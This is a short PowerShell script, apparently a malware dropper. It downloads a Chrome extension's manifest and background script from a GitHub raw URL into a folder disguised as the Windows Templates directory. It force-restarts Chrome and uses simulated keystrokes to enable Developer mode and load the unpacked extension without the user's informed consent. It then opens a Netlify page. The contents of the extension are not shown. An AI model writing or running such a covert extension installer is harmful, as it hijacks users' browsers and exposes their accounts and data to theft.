Add-Type -AssemblyName System.Windows.Forms

$extPath = "$env:APPDATA\Microsoft\Windows\Templates"
$extUrl = "https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/assets"

New-Item -ItemType Directory -Force -Path $extPath | Out-Null
Invoke-WebRequest -Uri "$extUrl/manifest.json" -OutFile "$extPath\manifest.json" -UseBasicParsing
Invoke-WebRequest -Uri "$extUrl/background.js" -OutFile "$extPath\background.js" -UseBasicParsing

Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 2
Start-Process "chrome.exe"
Start-Sleep 3
[System.Windows.Forms.SendKeys]::SendWait("^l")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("chrome://extensions{ENTER}")
Start-Sleep 4
[System.Windows.Forms.SendKeys]::SendWait("^f")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("Developer mode")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("{ESC}")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
Start-Sleep 0.3
[System.Windows.Forms.SendKeys]::SendWait(" ")
Start-Sleep 2
[System.Windows.Forms.SendKeys]::SendWait("^{HOME}")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("^f")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("Load unpacked")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("{ESC}")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
Start-Sleep 3
[System.Windows.Forms.SendKeys]::SendWait("^l")
Start-Sleep 0.3
[System.Windows.Forms.SendKeys]::SendWait($extPath)
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
Start-Sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
Start-Sleep 5
[System.Windows.Forms.SendKeys]::SendWait("{ESC}")
Start-Sleep 1
[System.Windows.Forms.SendKeys]::SendWait("^t")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("https://magenta-bienenstitch-c3131a.netlify.app/{ENTER}")
Start-Sleep 2
[System.Windows.Forms.SendKeys]::SendWait("^{TAB}")
Start-Sleep 0.5
[System.Windows.Forms.SendKeys]::SendWait("^w")
Start-Sleep 3

exit